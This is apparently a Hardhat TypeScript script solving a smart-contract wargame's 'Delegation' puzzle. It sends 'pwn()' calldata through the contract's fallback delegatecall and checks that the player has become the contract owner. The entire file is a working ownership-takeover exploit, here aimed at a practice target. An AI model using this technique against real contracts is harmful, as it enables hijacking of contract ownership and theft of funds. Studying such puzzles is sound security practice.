// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";
import assert from "assert";
import { Delegation } from "../typechain";

const PLAYER_ADDRESS = contractAddresses.Player;
const CONTRACT = contractAddresses.Delegation;
const abi = [
    "function owner() public view returns (address)",
    "function pwn() public"
  ];
  
async function main() {
    console.log(
        "Script to solve Delegation puzzle \n ========================================== \n"
    );

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Delegation", CONTRACT);

    // Send a transaction with the msg.data is the function signature of pwn() to contract
    // First create data for pwn() function
    const data = ethers.utils.id("pwn()");
    // console.log(data);
    console.log("contract: ", contract.address);

    await attacker.sendTransaction({
        to: contract.address,
        data: data,
    });

    const newOwner = await contract.owner();
    console.log("owner = ", newOwner);
    assert(newOwner === PLAYER_ADDRESS, "Owner not claimed");
    console.log("Ownership claimed, you can submit the solution");
}
// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
